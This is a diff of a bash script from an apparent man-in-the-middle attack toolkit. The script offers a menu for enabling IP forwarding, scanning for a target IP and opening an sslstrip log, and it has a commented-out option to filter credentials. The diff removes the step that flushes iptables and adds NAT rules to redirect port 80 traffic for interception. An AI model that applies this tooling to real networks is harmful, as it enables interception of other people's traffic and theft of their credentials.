@@ -22,7 +22,6 @@ then
 	clear
 	echo -e "------------------------------""$RS""MITM""$CE""-------------------------------"
 	echo -e """$YS"" 1""$CE"") Enable ip_forward                 ""$YS""d1""$CE"") Disable ip_forward "
-	echo -e """$YS"" 2""$CE"") Set iptables"
 	echo -e """$YS"" 3""$CE"") Scan and select target IP         ""$YS""33""$CE"") I have scaned"
 	echo -e """$YS"" 4""$CE"") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
 	echo -e """$YS"" b""$CE"") Go back"
@@ -37,28 +36,6 @@ then
 	elif [[ "$MITMCH" = "d1" ]]
 	then
 		echo "0" > /proc/sys/net/ipv4/ip_forward
-		echo -e "Done."
-		sleep 1
-	elif [[ "$MITMCH" = "2" ]]
-	then
-		clear
-		echo -e "Redirect tcp port 80 to port(""$YS""Enter""$CE""=8080):"
-		read PORTTCP
-		if [[ "$PORTTCP" = "" ]]
-		then
-			PORTTCP="8080"
-		fi
-					clear
-		echo -e "Redirect udp port 40 to port(""$YS""Enter""$CE""=40):"
-		read PORTUDP
-		if [[ "$PORTUDP" = "" ]]
-		then
-			PORTUDP="40"
-		fi
-		iptables --flush
-		iptables --flush -t nat
-		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$PORTTCP"
-		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port "$PORTUDP"
 		echo -e "Done."
 		sleep 1
 	elif [[ "$MITMCH" = "3" ]]
